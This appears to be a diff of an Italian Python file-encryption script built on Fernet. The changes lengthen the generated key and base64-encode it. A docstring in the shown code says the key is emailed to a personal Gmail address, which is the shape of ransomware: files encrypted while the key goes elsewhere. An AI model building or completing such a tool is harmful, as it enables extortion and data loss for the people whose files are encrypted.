@@ -1,4 +1,5 @@
 from cryptography.fernet import Fernet
+import base64
 import os
 import secrets
 import string
@@ -10,7 +11,7 @@ def genera_chiave():
     """Genera una chiave casuale per la cifratura dei
     file e la invia per email a pierobrandola@gmail.com
     """
-    lunghezza_c = 16
+    lunghezza_c = 32
     caratteri_c = string.ascii_letters + string.digits + string.punctuation + " "
     chiave = ''.join(secrets.choice(caratteri_c) for _ in range(lunghezza_c))
 
@@ -40,6 +41,7 @@ def cifra_file_singolo(file_path, chiave):
             file_data = file.read()
 
         # Crea un oggetto Fernet con la chiave
+        chiave = base64.b64encode(chiave.encode("utf-8"))
         fernet = Fernet(chiave)
 
         # Cifra i dati del file
